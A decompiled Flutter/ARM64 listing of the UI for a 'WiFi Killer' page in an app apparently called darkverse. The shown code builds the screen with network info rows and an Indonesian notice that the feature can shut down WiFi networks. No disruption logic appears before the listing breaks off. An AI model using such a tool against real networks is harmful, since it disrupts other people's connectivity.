// lib: , url: package:darkverse/wifi_external.dart

// class id: 1048829, size: 0x8
class :: {
}

// class id: 3613, size: 0xc, field offset: 0xc
//   const constructor, 
class WifiKillerPage extends StatefulWidget {

  _ createState(/* No info */) {
    // ** addr: 0x9ee8ec, size: 0x48
    // 0x9ee8ec: EnterFrame
    //     0x9ee8ec: stp             fp, lr, [SP, #-0x10]!
    //     0x9ee8f0: mov             fp, SP
    // 0x9ee8f4: AllocStack(0x8)
    //     0x9ee8f4: sub             SP, SP, #8
    // 0x9ee8f8: CheckStackOverflow
    //     0x9ee8f8: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x9ee8fc: cmp             SP, x16
    //     0x9ee900: b.ls            #0x9ee92c
    // 0x9ee904: r1 = <WifiKillerPage>
    //     0x9ee904: add             x1, PP, #0x32, lsl #12  ; [pp+0x32700] TypeArguments: <WifiKillerPage>
    //     0x9ee908: ldr             x1, [x1, #0x700]
    // 0x9ee90c: r0 = _WifiKillerPageState()
    //     0x9ee90c: bl              #0x9eea38  ; Allocate_WifiKillerPageStateStub -> _WifiKillerPageState (size=0x44)
    // 0x9ee910: mov             x1, x0
    // 0x9ee914: stur            x0, [fp, #-8]
    // 0x9ee918: r0 = _WifiKillerPageState()
    //     0x9ee918: bl              #0x9ee934  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_WifiKillerPageState
    // 0x9ee91c: ldur            x0, [fp, #-8]
    // 0x9ee920: LeaveFrame
    //     0x9ee920: mov             SP, fp
    //     0x9ee924: ldp             fp, lr, [SP], #0x10
    // 0x9ee928: ret
    //     0x9ee928: ret             
    // 0x9ee92c: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x9ee92c: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x9ee930: b               #0x9ee904
  }
}

// class id: 4043, size: 0x44, field offset: 0x14
class _WifiKillerPageState extends State<dynamic> {

  _ build(/* No info */) {
    // ** addr: 0x94a5f8, size: 0xad4
    // 0x94a5f8: EnterFrame
    //     0x94a5f8: stp             fp, lr, [SP, #-0x10]!
    //     0x94a5fc: mov             fp, SP
    // 0x94a600: AllocStack(0x80)
    //     0x94a600: sub             SP, SP, #0x80
    // 0x94a604: SetupParameters(_WifiKillerPageState this /* r1 => r1, fp-0x10 */)
    //     0x94a604: stur            x1, [fp, #-0x10]
    // 0x94a608: CheckStackOverflow
    //     0x94a608: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94a60c: cmp             SP, x16
    //     0x94a610: b.ls            #0x94b0c4
    // 0x94a614: LoadField: r0 = r1->field_37
    //     0x94a614: ldur            w0, [x1, #0x37]
    // 0x94a618: DecompressPointer r0
    //     0x94a618: add             x0, x0, HEAP, lsl #32
    // 0x94a61c: stur            x0, [fp, #-8]
    // 0x94a620: r0 = IconThemeData()
    //     0x94a620: bl              #0x4dce2c  ; AllocateIconThemeDataStub -> IconThemeData (size=0x2c)
    // 0x94a624: mov             x1, x0
    // 0x94a628: ldur            x0, [fp, #-8]
    // 0x94a62c: stur            x1, [fp, #-0x18]
    // 0x94a630: StoreField: r1->field_1b = r0
    //     0x94a630: stur            w0, [x1, #0x1b]
    // 0x94a634: r0 = TextStyle()
    //     0x94a634: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94a638: mov             x1, x0
    // 0x94a63c: r0 = true
    //     0x94a63c: add             x0, NULL, #0x20  ; true
    // 0x94a640: stur            x1, [fp, #-0x20]
    // 0x94a644: StoreField: r1->field_7 = r0
    //     0x94a644: stur            w0, [x1, #7]
    // 0x94a648: ldur            x2, [fp, #-8]
    // 0x94a64c: StoreField: r1->field_b = r2
    //     0x94a64c: stur            w2, [x1, #0xb]
    // 0x94a650: r3 = "Orbitron"
    //     0x94a650: add             x3, PP, #0xc, lsl #12  ; [pp+0xcf20] "Orbitron"
    //     0x94a654: ldr             x3, [x3, #0xf20]
    // 0x94a658: StoreField: r1->field_13 = r3
    //     0x94a658: stur            w3, [x1, #0x13]
    // 0x94a65c: r0 = Text()
    //     0x94a65c: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94a660: mov             x1, x0
    // 0x94a664: r0 = "WiFi Killer"
    //     0x94a664: add             x0, PP, #0x28, lsl #12  ; [pp+0x28c50] "WiFi Killer"
    //     0x94a668: ldr             x0, [x0, #0xc50]
    // 0x94a66c: stur            x1, [fp, #-0x28]
    // 0x94a670: StoreField: r1->field_b = r0
    //     0x94a670: stur            w0, [x1, #0xb]
    // 0x94a674: ldur            x0, [fp, #-0x20]
    // 0x94a678: StoreField: r1->field_13 = r0
    //     0x94a678: stur            w0, [x1, #0x13]
    // 0x94a67c: r0 = AppBar()
    //     0x94a67c: bl              #0x5fadf4  ; AllocateAppBarStub -> AppBar (size=0x98)
    // 0x94a680: stur            x0, [fp, #-0x20]
    // 0x94a684: r16 = Instance_Color
    //     0x94a684: add             x16, PP, #0xb, lsl #12  ; [pp+0xbdc0] Obj!Color@a0e491
    //     0x94a688: ldr             x16, [x16, #0xdc0]
    // 0x94a68c: ldur            lr, [fp, #-0x18]
    // 0x94a690: stp             lr, x16, [SP, #0x10]
    // 0x94a694: ldur            x16, [fp, #-0x28]
    // 0x94a698: r30 = 0.000000
    //     0x94a698: ldr             lr, [PP, #0x4910]  ; [pp+0x4910] 0
    // 0x94a69c: stp             lr, x16, [SP]
    // 0x94a6a0: mov             x1, x0
    // 0x94a6a4: r4 = const [0, 0x5, 0x4, 0x1, backgroundColor, 0x1, elevation, 0x4, iconTheme, 0x2, title, 0x3, null]
    //     0x94a6a4: add             x4, PP, #0x37, lsl #12  ; [pp+0x37390] List(13) [0, 0x5, 0x4, 0x1, "backgroundColor", 0x1, "elevation", 0x4, "iconTheme", 0x2, "title", 0x3, Null]
    //     0x94a6a8: ldr             x4, [x4, #0x390]
    // 0x94a6ac: r0 = AppBar()
    //     0x94a6ac: bl              #0x5fa308  ; [package:flutter/src/material/app_bar.dart] AppBar::AppBar
    // 0x94a6b0: r0 = TextStyle()
    //     0x94a6b0: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94a6b4: mov             x1, x0
    // 0x94a6b8: r0 = true
    //     0x94a6b8: add             x0, NULL, #0x20  ; true
    // 0x94a6bc: stur            x1, [fp, #-0x18]
    // 0x94a6c0: StoreField: r1->field_7 = r0
    //     0x94a6c0: stur            w0, [x1, #7]
    // 0x94a6c4: r2 = Instance_Color
    //     0x94a6c4: add             x2, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94a6c8: ldr             x2, [x2, #0xd28]
    // 0x94a6cc: StoreField: r1->field_b = r2
    //     0x94a6cc: stur            w2, [x1, #0xb]
    // 0x94a6d0: r3 = 22.000000
    //     0x94a6d0: add             x3, PP, #0x11, lsl #12  ; [pp+0x11520] 22
    //     0x94a6d4: ldr             x3, [x3, #0x520]
    // 0x94a6d8: StoreField: r1->field_1f = r3
    //     0x94a6d8: stur            w3, [x1, #0x1f]
    // 0x94a6dc: r3 = Instance_FontWeight
    //     0x94a6dc: add             x3, PP, #0xc, lsl #12  ; [pp+0xcf08] Obj!FontWeight@a0c471
    //     0x94a6e0: ldr             x3, [x3, #0xf08]
    // 0x94a6e4: StoreField: r1->field_23 = r3
    //     0x94a6e4: stur            w3, [x1, #0x23]
    // 0x94a6e8: r4 = "Orbitron"
    //     0x94a6e8: add             x4, PP, #0xc, lsl #12  ; [pp+0xcf20] "Orbitron"
    //     0x94a6ec: ldr             x4, [x4, #0xf20]
    // 0x94a6f0: StoreField: r1->field_13 = r4
    //     0x94a6f0: stur            w4, [x1, #0x13]
    // 0x94a6f4: r0 = Text()
    //     0x94a6f4: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94a6f8: mov             x1, x0
    // 0x94a6fc: r0 = "Network Analysis"
    //     0x94a6fc: add             x0, PP, #0x37, lsl #12  ; [pp+0x37398] "Network Analysis"
    //     0x94a700: ldr             x0, [x0, #0x398]
    // 0x94a704: stur            x1, [fp, #-0x28]
    // 0x94a708: StoreField: r1->field_b = r0
    //     0x94a708: stur            w0, [x1, #0xb]
    // 0x94a70c: ldur            x0, [fp, #-0x18]
    // 0x94a710: StoreField: r1->field_13 = r0
    //     0x94a710: stur            w0, [x1, #0x13]
    // 0x94a714: ldur            x0, [fp, #-0x10]
    // 0x94a718: LoadField: r2 = r0->field_3b
    //     0x94a718: ldur            w2, [x0, #0x3b]
    // 0x94a71c: DecompressPointer r2
    //     0x94a71c: add             x2, x2, HEAP, lsl #32
    // 0x94a720: stur            x2, [fp, #-0x18]
    // 0x94a724: r0 = TextStyle()
    //     0x94a724: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94a728: mov             x1, x0
    // 0x94a72c: r0 = true
    //     0x94a72c: add             x0, NULL, #0x20  ; true
    // 0x94a730: stur            x1, [fp, #-0x30]
    // 0x94a734: StoreField: r1->field_7 = r0
    //     0x94a734: stur            w0, [x1, #7]
    // 0x94a738: ldur            x2, [fp, #-0x18]
    // 0x94a73c: StoreField: r1->field_b = r2
    //     0x94a73c: stur            w2, [x1, #0xb]
    // 0x94a740: r2 = 14.000000
    //     0x94a740: add             x2, PP, #0xb, lsl #12  ; [pp+0xbb28] 14
    //     0x94a744: ldr             x2, [x2, #0xb28]
    // 0x94a748: StoreField: r1->field_1f = r2
    //     0x94a748: stur            w2, [x1, #0x1f]
    // 0x94a74c: r0 = Text()
    //     0x94a74c: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94a750: mov             x1, x0
    // 0x94a754: r0 = "Feature ini mampu mematikan jaringan WiFi yang anda sambung.\n⚠️ Gunakan hanya untuk testing pribadi."
    //     0x94a754: add             x0, PP, #0x37, lsl #12  ; [pp+0x373a0] "Feature ini mampu mematikan jaringan WiFi yang anda sambung.\n⚠️ Gunakan hanya untuk testing pribadi."
    //     0x94a758: ldr             x0, [x0, #0x3a0]
    // 0x94a75c: stur            x1, [fp, #-0x18]
    // 0x94a760: StoreField: r1->field_b = r0
    //     0x94a760: stur            w0, [x1, #0xb]
    // 0x94a764: ldur            x0, [fp, #-0x30]
    // 0x94a768: StoreField: r1->field_13 = r0
    //     0x94a768: stur            w0, [x1, #0x13]
    // 0x94a76c: r0 = Radius()
    //     0x94a76c: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x94a770: d0 = 16.000000
    //     0x94a770: fmov            d0, #16.00000000
    // 0x94a774: stur            x0, [fp, #-0x30]
    // 0x94a778: StoreField: r0->field_7 = d0
    //     0x94a778: stur            d0, [x0, #7]
    // 0x94a77c: StoreField: r0->field_f = d0
    //     0x94a77c: stur            d0, [x0, #0xf]
    // 0x94a780: r0 = BorderRadius()
    //     0x94a780: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x94a784: mov             x2, x0
    // 0x94a788: ldur            x0, [fp, #-0x30]
    // 0x94a78c: stur            x2, [fp, #-0x38]
    // 0x94a790: StoreField: r2->field_7 = r0
    //     0x94a790: stur            w0, [x2, #7]
    // 0x94a794: StoreField: r2->field_b = r0
    //     0x94a794: stur            w0, [x2, #0xb]
    // 0x94a798: StoreField: r2->field_f = r0
    //     0x94a798: stur            w0, [x2, #0xf]
    // 0x94a79c: StoreField: r2->field_13 = r0
    //     0x94a79c: stur            w0, [x2, #0x13]
    // 0x94a7a0: r1 = Instance_Color
    //     0x94a7a0: add             x1, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94a7a4: ldr             x1, [x1, #0xd28]
    // 0x94a7a8: d0 = 0.300000
    //     0x94a7a8: add             x17, PP, #0xd, lsl #12  ; [pp+0xd180] IMM: double(0.3) from 0x3fd3333333333333
    //     0x94a7ac: ldr             d0, [x17, #0x180]
    // 0x94a7b0: r0 = withOpacity()
    //     0x94a7b0: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x94a7b4: str             x0, [SP]
    // 0x94a7b8: r1 = Null
    //     0x94a7b8: mov             x1, NULL
    // 0x94a7bc: r4 = const [0, 0x2, 0x1, 0x1, color, 0x1, null]
    //     0x94a7bc: add             x4, PP, #0xb, lsl #12  ; [pp+0xbc68] List(7) [0, 0x2, 0x1, 0x1, "color", 0x1, Null]
    //     0x94a7c0: ldr             x4, [x4, #0xc68]
    // 0x94a7c4: r0 = Border.all()
    //     0x94a7c4: bl              #0x6b0744  ; [package:flutter/src/painting/box_border.dart] Border::Border.all
    // 0x94a7c8: r1 = Instance_Color
    //     0x94a7c8: add             x1, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94a7cc: ldr             x1, [x1, #0xd28]
    // 0x94a7d0: d0 = 0.100000
    //     0x94a7d0: add             x17, PP, #0xc, lsl #12  ; [pp+0xc100] IMM: double(0.1) from 0x3fb999999999999a
    //     0x94a7d4: ldr             d0, [x17, #0x100]
    // 0x94a7d8: stur            x0, [fp, #-0x30]
    // 0x94a7dc: r0 = withOpacity()
    //     0x94a7dc: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x94a7e0: stur            x0, [fp, #-0x40]
    // 0x94a7e4: r0 = Offset()
    //     0x94a7e4: bl              #0x462c5c  ; AllocateOffsetStub -> Offset (size=0x18)
    // 0x94a7e8: stur            x0, [fp, #-0x48]
    // 0x94a7ec: StoreField: r0->field_7 = rZR
    //     0x94a7ec: stur            xzr, [x0, #7]
    // 0x94a7f0: d0 = 5.000000
    //     0x94a7f0: fmov            d0, #5.00000000
    // 0x94a7f4: StoreField: r0->field_f = d0
    //     0x94a7f4: stur            d0, [x0, #0xf]
    // 0x94a7f8: r0 = BoxShadow()
    //     0x94a7f8: bl              #0x5b73a8  ; AllocateBoxShadowStub -> BoxShadow (size=0x24)
    // 0x94a7fc: stur            x0, [fp, #-0x50]
    // 0x94a800: ArrayStore: r0[0] = rZR  ; List_8
    //     0x94a800: stur            xzr, [x0, #0x17]
    // 0x94a804: r3 = Instance_BlurStyle
    //     0x94a804: add             x3, PP, #0xc, lsl #12  ; [pp+0xcc80] Obj!BlurStyle@a43cc1
    //     0x94a808: ldr             x3, [x3, #0xc80]
    // 0x94a80c: StoreField: r0->field_1f = r3
    //     0x94a80c: stur            w3, [x0, #0x1f]
    // 0x94a810: ldur            x1, [fp, #-0x40]
    // 0x94a814: StoreField: r0->field_7 = r1
    //     0x94a814: stur            w1, [x0, #7]
    // 0x94a818: ldur            x1, [fp, #-0x48]
    // 0x94a81c: StoreField: r0->field_b = r1
    //     0x94a81c: stur            w1, [x0, #0xb]
    // 0x94a820: d0 = 10.000000
    //     0x94a820: fmov            d0, #10.00000000
    // 0x94a824: StoreField: r0->field_f = d0
    //     0x94a824: stur            d0, [x0, #0xf]
    // 0x94a828: r1 = Null
    //     0x94a828: mov             x1, NULL
    // 0x94a82c: r2 = 2
    //     0x94a82c: mov             x2, #2
    // 0x94a830: r0 = AllocateArray()
    //     0x94a830: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94a834: mov             x2, x0
    // 0x94a838: ldur            x0, [fp, #-0x50]
    // 0x94a83c: stur            x2, [fp, #-0x40]
    // 0x94a840: StoreField: r2->field_f = r0
    //     0x94a840: stur            w0, [x2, #0xf]
    // 0x94a844: r1 = <BoxShadow>
    //     0x94a844: add             x1, PP, #0xc, lsl #12  ; [pp+0xcc88] TypeArguments: <BoxShadow>
    //     0x94a848: ldr             x1, [x1, #0xc88]
    // 0x94a84c: r0 = AllocateGrowableArray()
    //     0x94a84c: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x94a850: mov             x1, x0
    // 0x94a854: ldur            x0, [fp, #-0x40]
    // 0x94a858: stur            x1, [fp, #-0x48]
    // 0x94a85c: StoreField: r1->field_f = r0
    //     0x94a85c: stur            w0, [x1, #0xf]
    // 0x94a860: r2 = 2
    //     0x94a860: mov             x2, #2
    // 0x94a864: StoreField: r1->field_b = r2
    //     0x94a864: stur            w2, [x1, #0xb]
    // 0x94a868: r0 = BoxDecoration()
    //     0x94a868: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x94a86c: mov             x4, x0
    // 0x94a870: r0 = Instance_Color
    //     0x94a870: add             x0, PP, #0x32, lsl #12  ; [pp+0x32708] Obj!Color@a11581
    //     0x94a874: ldr             x0, [x0, #0x708]
    // 0x94a878: stur            x4, [fp, #-0x40]
    // 0x94a87c: StoreField: r4->field_7 = r0
    //     0x94a87c: stur            w0, [x4, #7]
    // 0x94a880: ldur            x0, [fp, #-0x30]
    // 0x94a884: StoreField: r4->field_f = r0
    //     0x94a884: stur            w0, [x4, #0xf]
    // 0x94a888: ldur            x0, [fp, #-0x38]
    // 0x94a88c: StoreField: r4->field_13 = r0
    //     0x94a88c: stur            w0, [x4, #0x13]
    // 0x94a890: ldur            x0, [fp, #-0x48]
    // 0x94a894: ArrayStore: r4[0] = r0  ; List_4
    //     0x94a894: stur            w0, [x4, #0x17]
    // 0x94a898: r0 = Instance_BoxShape
    //     0x94a898: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x94a89c: ldr             x0, [x0, #0xd78]
    // 0x94a8a0: StoreField: r4->field_23 = r0
    //     0x94a8a0: stur            w0, [x4, #0x23]
    // 0x94a8a4: ldur            x5, [fp, #-0x10]
    // 0x94a8a8: LoadField: r3 = r5->field_13
    //     0x94a8a8: ldur            w3, [x5, #0x13]
    // 0x94a8ac: DecompressPointer r3
    //     0x94a8ac: add             x3, x3, HEAP, lsl #32
    // 0x94a8b0: mov             x1, x5
    // 0x94a8b4: r2 = "SSID"
    //     0x94a8b4: add             x2, PP, #0x37, lsl #12  ; [pp+0x373a8] "SSID"
    //     0x94a8b8: ldr             x2, [x2, #0x3a8]
    // 0x94a8bc: r0 = _infoRow()
    //     0x94a8bc: bl              #0x94b0cc  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_infoRow
    // 0x94a8c0: mov             x4, x0
    // 0x94a8c4: ldur            x0, [fp, #-0x10]
    // 0x94a8c8: stur            x4, [fp, #-0x30]
    // 0x94a8cc: ArrayLoad: r3 = r0[0]  ; List_4
    //     0x94a8cc: ldur            w3, [x0, #0x17]
    // 0x94a8d0: DecompressPointer r3
    //     0x94a8d0: add             x3, x3, HEAP, lsl #32
    // 0x94a8d4: mov             x1, x0
    // 0x94a8d8: r2 = "IP Address"
    //     0x94a8d8: add             x2, PP, #0x37, lsl #12  ; [pp+0x373b0] "IP Address"
    //     0x94a8dc: ldr             x2, [x2, #0x3b0]
    // 0x94a8e0: r0 = _infoRow()
    //     0x94a8e0: bl              #0x94b0cc  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_infoRow
    // 0x94a8e4: mov             x3, x0
    // 0x94a8e8: ldur            x0, [fp, #-0x10]
    // 0x94a8ec: stur            x3, [fp, #-0x48]
    // 0x94a8f0: LoadField: r4 = r0->field_1b
    //     0x94a8f0: ldur            w4, [x0, #0x1b]
    // 0x94a8f4: DecompressPointer r4
    //     0x94a8f4: add             x4, x4, HEAP, lsl #32
    // 0x94a8f8: stur            x4, [fp, #-0x38]
    // 0x94a8fc: r1 = Null
    //     0x94a8fc: mov             x1, NULL
    // 0x94a900: r2 = 4
    //     0x94a900: mov             x2, #4
    // 0x94a904: r0 = AllocateArray()
    //     0x94a904: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94a908: mov             x1, x0
    // 0x94a90c: ldur            x0, [fp, #-0x38]
    // 0x94a910: StoreField: r1->field_f = r0
    //     0x94a910: stur            w0, [x1, #0xf]
    // 0x94a914: r16 = " MHz"
    //     0x94a914: add             x16, PP, #0x37, lsl #12  ; [pp+0x373b8] " MHz"
    //     0x94a918: ldr             x16, [x16, #0x3b8]
    // 0x94a91c: StoreField: r1->field_13 = r16
    //     0x94a91c: stur            w16, [x1, #0x13]
    // 0x94a920: str             x1, [SP]
    // 0x94a924: r0 = _interpolate()
    //     0x94a924: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x94a928: ldur            x1, [fp, #-0x10]
    // 0x94a92c: mov             x3, x0
    // 0x94a930: r2 = "Frequency"
    //     0x94a930: add             x2, PP, #0x37, lsl #12  ; [pp+0x373c0] "Frequency"
    //     0x94a934: ldr             x2, [x2, #0x3c0]
    // 0x94a938: r0 = _infoRow()
    //     0x94a938: bl              #0x94b0cc  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_infoRow
    // 0x94a93c: mov             x4, x0
    // 0x94a940: ldur            x0, [fp, #-0x10]
    // 0x94a944: stur            x4, [fp, #-0x38]
    // 0x94a948: LoadField: r3 = r0->field_1f
    //     0x94a948: ldur            w3, [x0, #0x1f]
    // 0x94a94c: DecompressPointer r3
    //     0x94a94c: add             x3, x3, HEAP, lsl #32
    // 0x94a950: mov             x1, x0
    // 0x94a954: r2 = "Router IP"
    //     0x94a954: add             x2, PP, #0x37, lsl #12  ; [pp+0x373c8] "Router IP"
    //     0x94a958: ldr             x2, [x2, #0x3c8]
    // 0x94a95c: r0 = _infoRow()
    //     0x94a95c: bl              #0x94b0cc  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_infoRow
    // 0x94a960: r1 = Null
    //     0x94a960: mov             x1, NULL
    // 0x94a964: r2 = 8
    //     0x94a964: mov             x2, #8
    // 0x94a968: stur            x0, [fp, #-0x50]
    // 0x94a96c: r0 = AllocateArray()
    //     0x94a96c: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94a970: mov             x2, x0
    // 0x94a974: ldur            x0, [fp, #-0x30]
    // 0x94a978: stur            x2, [fp, #-0x58]
    // 0x94a97c: StoreField: r2->field_f = r0
    //     0x94a97c: stur            w0, [x2, #0xf]
    // 0x94a980: ldur            x0, [fp, #-0x48]
    // 0x94a984: StoreField: r2->field_13 = r0
    //     0x94a984: stur            w0, [x2, #0x13]
    // 0x94a988: ldur            x0, [fp, #-0x38]
    // 0x94a98c: ArrayStore: r2[0] = r0  ; List_4
    //     0x94a98c: stur            w0, [x2, #0x17]
    // 0x94a990: ldur            x0, [fp, #-0x50]
    // 0x94a994: StoreField: r2->field_1b = r0
    //     0x94a994: stur            w0, [x2, #0x1b]
    // 0x94a998: r1 = <Widget>
    //     0x94a998: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x94a99c: r0 = AllocateGrowableArray()
    //     0x94a99c: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x94a9a0: mov             x1, x0
    // 0x94a9a4: ldur            x0, [fp, #-0x58]
    // 0x94a9a8: stur            x1, [fp, #-0x30]
    // 0x94a9ac: StoreField: r1->field_f = r0
    //     0x94a9ac: stur            w0, [x1, #0xf]
    // 0x94a9b0: r0 = 8
    //     0x94a9b0: mov             x0, #8
    // 0x94a9b4: StoreField: r1->field_b = r0
    //     0x94a9b4: stur            w0, [x1, #0xb]
    // 0x94a9b8: r0 = Column()
    //     0x94a9b8: bl              #0x641538  ; AllocateColumnStub -> Column (size=0x38)
    // 0x94a9bc: mov             x1, x0
    // 0x94a9c0: r0 = Instance_Axis
    //     0x94a9c0: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x94a9c4: stur            x1, [fp, #-0x38]
    // 0x94a9c8: StoreField: r1->field_f = r0
    //     0x94a9c8: stur            w0, [x1, #0xf]
    // 0x94a9cc: r2 = Instance_MainAxisAlignment
    //     0x94a9cc: ldr             x2, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x94a9d0: StoreField: r1->field_13 = r2
    //     0x94a9d0: stur            w2, [x1, #0x13]
    // 0x94a9d4: r3 = Instance_MainAxisSize
    //     0x94a9d4: add             x3, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x94a9d8: ldr             x3, [x3, #0xbc0]
    // 0x94a9dc: ArrayStore: r1[0] = r3  ; List_4
    //     0x94a9dc: stur            w3, [x1, #0x17]
    // 0x94a9e0: r4 = Instance_CrossAxisAlignment
    //     0x94a9e0: add             x4, PP, #0xa, lsl #12  ; [pp+0xada0] Obj!CrossAxisAlignment@a402e1
    //     0x94a9e4: ldr             x4, [x4, #0xda0]
    // 0x94a9e8: StoreField: r1->field_1b = r4
    //     0x94a9e8: stur            w4, [x1, #0x1b]
    // 0x94a9ec: r5 = Instance_VerticalDirection
    //     0x94a9ec: ldr             x5, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x94a9f0: StoreField: r1->field_23 = r5
    //     0x94a9f0: stur            w5, [x1, #0x23]
    // 0x94a9f4: r6 = Instance_Clip
    //     0x94a9f4: ldr             x6, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x94a9f8: StoreField: r1->field_2b = r6
    //     0x94a9f8: stur            w6, [x1, #0x2b]
    // 0x94a9fc: StoreField: r1->field_2f = rZR
    //     0x94a9fc: stur            xzr, [x1, #0x2f]
    // 0x94aa00: ldur            x7, [fp, #-0x30]
    // 0x94aa04: StoreField: r1->field_b = r7
    //     0x94aa04: stur            w7, [x1, #0xb]
    // 0x94aa08: r0 = Container()
    //     0x94aa08: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x94aa0c: stur            x0, [fp, #-0x30]
    // 0x94aa10: ldur            x16, [fp, #-0x40]
    // 0x94aa14: r30 = Instance_EdgeInsets
    //     0x94aa14: ldr             lr, [PP, #0x5348]  ; [pp+0x5348] Obj!EdgeInsets@a05fc1
    // 0x94aa18: stp             lr, x16, [SP, #8]
    // 0x94aa1c: ldur            x16, [fp, #-0x38]
    // 0x94aa20: str             x16, [SP]
    // 0x94aa24: mov             x1, x0
    // 0x94aa28: r4 = const [0, 0x4, 0x3, 0x1, child, 0x3, decoration, 0x1, padding, 0x2, null]
    //     0x94aa28: add             x4, PP, #0x12, lsl #12  ; [pp+0x12058] List(11) [0, 0x4, 0x3, 0x1, "child", 0x3, "decoration", 0x1, "padding", 0x2, Null]
    //     0x94aa2c: ldr             x4, [x4, #0x58]
    // 0x94aa30: r0 = Container()
    //     0x94aa30: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x94aa34: ldur            x2, [fp, #-0x10]
    // 0x94aa38: LoadField: r0 = r2->field_23
    //     0x94aa38: ldur            w0, [x2, #0x23]
    // 0x94aa3c: DecompressPointer r0
    //     0x94aa3c: add             x0, x0, HEAP, lsl #32
    // 0x94aa40: stur            x0, [fp, #-0x48]
    // 0x94aa44: tbnz            w0, #4, #0x94aa50
    // 0x94aa48: r1 = Null
    //     0x94aa48: mov             x1, NULL
    // 0x94aa4c: b               #0x94aa58
    // 0x94aa50: r1 = Instance_LinearGradient
    //     0x94aa50: add             x1, PP, #0x32, lsl #12  ; [pp+0x32710] Obj!LinearGradient@a05ae1
    //     0x94aa54: ldr             x1, [x1, #0x710]
    // 0x94aa58: stur            x1, [fp, #-0x40]
    // 0x94aa5c: tbnz            w0, #4, #0x94aa6c
    // 0x94aa60: r3 = Instance_Color
    //     0x94aa60: add             x3, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94aa64: ldr             x3, [x3, #0xd28]
    // 0x94aa68: b               #0x94aa70
    // 0x94aa6c: r3 = Null
    //     0x94aa6c: mov             x3, NULL
    // 0x94aa70: stur            x3, [fp, #-0x38]
    // 0x94aa74: r0 = Radius()
    //     0x94aa74: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x94aa78: d0 = 25.000000
    //     0x94aa78: fmov            d0, #25.00000000
    // 0x94aa7c: stur            x0, [fp, #-0x50]
    // 0x94aa80: StoreField: r0->field_7 = d0
    //     0x94aa80: stur            d0, [x0, #7]
    // 0x94aa84: StoreField: r0->field_f = d0
    //     0x94aa84: stur            d0, [x0, #0xf]
    // 0x94aa88: r0 = BorderRadius()
    //     0x94aa88: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x94aa8c: mov             x2, x0
    // 0x94aa90: ldur            x0, [fp, #-0x50]
    // 0x94aa94: stur            x2, [fp, #-0x58]
    // 0x94aa98: StoreField: r2->field_7 = r0
    //     0x94aa98: stur            w0, [x2, #7]
    // 0x94aa9c: StoreField: r2->field_b = r0
    //     0x94aa9c: stur            w0, [x2, #0xb]
    // 0x94aaa0: StoreField: r2->field_f = r0
    //     0x94aaa0: stur            w0, [x2, #0xf]
    // 0x94aaa4: StoreField: r2->field_13 = r0
    //     0x94aaa4: stur            w0, [x2, #0x13]
    // 0x94aaa8: ldur            x0, [fp, #-0x48]
    // 0x94aaac: tbnz            w0, #4, #0x94aac0
    // 0x94aab0: mov             x0, x2
    // 0x94aab4: r4 = Instance_Color
    //     0x94aab4: add             x4, PP, #0xb, lsl #12  ; [pp+0xbdc0] Obj!Color@a0e491
    //     0x94aab8: ldr             x4, [x4, #0xdc0]
    // 0x94aabc: b               #0x94aadc
    // 0x94aac0: r1 = Instance_Color
    //     0x94aac0: add             x1, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94aac4: ldr             x1, [x1, #0xd28]
    // 0x94aac8: d0 = 0.400000
    //     0x94aac8: add             x17, PP, #0xb, lsl #12  ; [pp+0xb260] IMM: double(0.4) from 0x3fd999999999999a
    //     0x94aacc: ldr             d0, [x17, #0x260]
    // 0x94aad0: r0 = withOpacity()
    //     0x94aad0: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x94aad4: mov             x4, x0
